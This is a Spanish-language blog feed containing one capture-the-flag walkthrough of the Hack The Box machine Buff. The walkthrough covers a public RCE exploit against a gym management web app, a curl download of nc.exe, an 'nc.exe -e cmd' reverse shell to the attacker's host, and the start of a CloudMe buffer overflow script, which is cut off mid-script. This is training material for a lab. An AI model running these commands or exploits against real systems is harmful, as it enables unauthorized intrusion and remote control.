<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-10-31T17:30:20-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pirrandi Blog</title><subtitle>Este es mi blog personal sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.
</subtitle><author><name>Pirrandi</name></author><entry><title type="html">Maquina Retirada Buff de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2023/09/29/Buff-Bof.html" rel="alternate" type="text/html" title="Maquina Retirada Buff de Hack The Box (Necesario VIP)" /><published>2023-09-29T00:00:00-03:00</published><updated>2023-09-29T00:00:00-03:00</updated><id>http://localhost:4000/2023/09/29/Buff-Bof</id><content type="html" xml:base="http://localhost:4000/2023/09/29/Buff-Bof.html">&lt;h1 id=&quot;buff--hack-the-box&quot;&gt;BUFF ~ Hack The Box&lt;/h1&gt;

&lt;p&gt;Machine IP 10.10.10.198&lt;/p&gt;

&lt;p&gt;Procedemos a realizar los escaneos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; que hacemos siempre:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cat target                                                                 &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Mon Sep  6 20:32:33 2021 as: nmap -sC -sV -p22,80 -oN target 10.10.11.105&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.105
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.046s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    nginx 1.14.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: nginx/1.14.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hechando un Ojo a la web, conseguimos ver el CMS que utiliza:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Made using Gym Management Software 1.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Buscamos en Searchsploit&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# searchsploit Gym Management                               &lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;----------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                                                                                    |  Path
&lt;span class=&quot;nt&quot;&gt;----------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Gym Management System 1.0 - &lt;span class=&quot;s1&quot;&gt;&apos;id&apos;&lt;/span&gt; SQL Injection                                                                                    | php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass                                                                                 | php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scripting                                                                           | php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remote Code Execution                                                                 | php/webapps/48506.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Encontramos un exploit de RCE y probamos a utilizarlo&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# python GymManagement.py                                                                                                                                     1 ⨯&lt;/span&gt;
            /&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
/vvvvvvvvvvvv &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-------------------------------------&lt;/span&gt;,
&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;^^^^^^^^^^^^ /&lt;span class=&quot;o&quot;&gt;============&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;BOKU&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=====================&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;
            &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;

(+) Usage:       python GymManagement.py &amp;lt;WEBAPP_URL&amp;gt;
(+) Example:     python GymManagement.py &apos;https://10.0.0.3:443/gym/&apos;
                                                                                                                                                                    
┌──(root💀pro)-[/home/…/Escritorio/HTB/Buff/exploits]
└─# python GymManagement.py http://10.10.10.198:8080/                                                                                                         255 ⨯
            /&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
/vvvvvvvvvvvv &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-------------------------------------,
&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;^^^^^^^^^^^^ /&lt;span class=&quot;o&quot;&gt;============&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;BOKU&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=====================&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;
            &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;

[+] Successfully connected to webshell.
C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ampp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;tdocs&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ym&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;pload&amp;gt; whoami
�PNG
▒
buff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;haun
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos que con esta shell no podemos movernos hacia atras en directorios etc, asique probamos a pasarnos un nc.exe para enviarnos un R-Shell potente.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ampp&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tdocs&lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;ym&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;pload&amp;gt; curl http://10.10.16.4/nc.exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; nc.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Compartimos un server python3 -m http.server 80 con el recurso de nc.exe&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ampp&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tdocs&lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;ym&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;pload&amp;gt; nc.exe &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; cmd 10.10.16.4 443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos ponemos a la escucha:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# rlwrap nc -vlnp 443&lt;/span&gt;
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.16.4] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.198] 49753
Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.17134.1610]
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2018 Microsoft Corporation. All rights reserved.

C:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ampp&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tdocs&lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;ym&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;pload&amp;gt;

Directory of C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;haun&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop

14/07/2020  13:27    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
14/07/2020  13:27    &amp;lt;DIR&amp;gt;          ..
06/09/2021  11:47                34 user.txt
               1 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             34 bytes
               2 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   7,623,385,088 bytes free

&lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;user&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;user&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;

user.txt
2363dc8a282b3f13bad614f6fxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a subir el winPEASx86 para enumerar el sistema:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ampp&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tdocs&lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;ym&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;pload&amp;gt; curl http://10.10.16.5/winPEASx86.exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; winPEASx86.exe
�PNG
▒

C:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;ampp&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;tdocs&lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;ym&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;pload&amp;gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&quot;buffer-overflow&quot;&gt;BUFFER OVERFLOW&lt;/h1&gt;
&lt;p&gt;Procedemos a hacer el Buffer OverFlow en una maquina windows 7 a nivel local con el binario de CloudMe para posteriormente repetir el proceso
en la maquina victima Buff.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Requisitos: 
- Immunity Debugger
- binario Malicioso &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;puerto 8888&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; CloudMe
- chisel &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Port Forwarding&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;pre&gt;&lt;code class=&quot;language-Bash&quot;&gt;####################### -- BOF -- ##############################
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nos definimos un archivo en python3 llamado exploit.py&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-ppython3&quot;&gt;#!/usr/bin/python3

import requests
import signal
import pdb
import sys
import os
import socket

from pwn import *
from struct import pack


def def_handler(sig, frame):
                print(&quot;\n[+] Saliendo ...\n&quot;)
                sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
remoteAddress = &quot;127.0.0.1&quot;

def executeExploit():

        payload = b&apos;A&apos;*5000

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((remoteAddress, 8888))
        s.send(payload)



if __name__ == &apos;__main__&apos;:

        executeExploit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos creamos con pattern_create.rb un listado de 5 mil caracteres aleatorios para introducirlos como PAYLOAD EN NUESTRO exploit.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000 &lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3A.. .. .. 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Le metemos como payload la siguiente linea para identificar la junk antes del EIP&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python3&quot;&gt;#!/usr/bin/python3

import requests
import signal
import pdb
import sys
import os
import socket

from pwn import *
from struct import pack


def def_handler(sig, frame):
                print(&quot;\n[+] Saliendo ...\n&quot;)
                sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
remoteAddress = &quot;127.0.0.1&quot;

def executeExploit():

        # Modificamos el payload para pasarle los caracteres creados con pattern-create e identificar el valor del EIP
        # /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000

        payload = b&apos;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk&apos;

        # Posteriormente cogemos el numero del registro del [EIP] y se lo pasamos a pattern-offset
        # /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 316A4230

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((remoteAddress, 8888))
        s.send(payload)



